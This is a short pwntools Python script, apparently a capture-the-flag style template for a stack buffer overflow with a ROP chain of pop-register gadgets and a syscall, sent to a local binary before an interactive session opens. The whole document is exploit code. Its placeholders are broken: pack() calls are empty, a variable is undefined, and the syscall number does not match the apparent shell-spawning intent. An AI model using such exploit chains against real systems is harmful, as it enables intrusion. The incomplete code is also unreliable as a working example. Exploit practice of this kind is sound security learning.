from pwn import *
elf= context.binary = ELF('./binary')
io=process()

offset=10 ## to overwrite the return address

pop_rax=pack()
pop_rdi=pack()
pop_rsi=pack()
pop_rdx=pack()
syscall=pack()
syscall_number=0
syscall_name=pack(address)

payload= offset*b'a' + pop_rax + pack(syscall_number) + pop_rdi + syscall_name + pop_rsi + pack(0) + pop_rdx + pack(0) + syscall

io.sendline(payload)
io.interactive()
